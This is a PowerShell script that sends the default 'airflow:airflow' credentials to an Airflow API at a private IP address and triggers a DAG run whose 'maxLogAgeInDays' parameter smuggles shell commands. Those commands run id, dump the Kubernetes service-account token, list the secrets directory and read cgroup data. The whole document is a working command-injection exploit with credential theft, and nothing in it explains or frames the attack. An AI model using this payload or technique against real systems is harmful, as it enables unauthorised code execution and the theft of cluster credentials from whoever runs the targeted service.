$cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))
$headers = @{
    Authorization = "Basic $cred"
    "Content-Type" = "application/json"
}
$jsonBody = '{"conf":{"maxLogAgeInDays":"7;id;cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null||echo NO_K8S_TOKEN;ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null||echo NO_K8S_DIR;cat /proc/self/cgroup 2>/dev/null|head -5;#"},"note":"k8s_check"}'
try {
    $r = Invoke-WebRequest -Uri "http://10.9.100.198:8080/api/v1/dags/maintenance_logs_cleanup/dagRuns" -Method POST -Headers $headers -Body $jsonBody -UseBasicParsing -TimeoutSec 15
    $r.Content
} catch {
    $_.Exception.Message
}
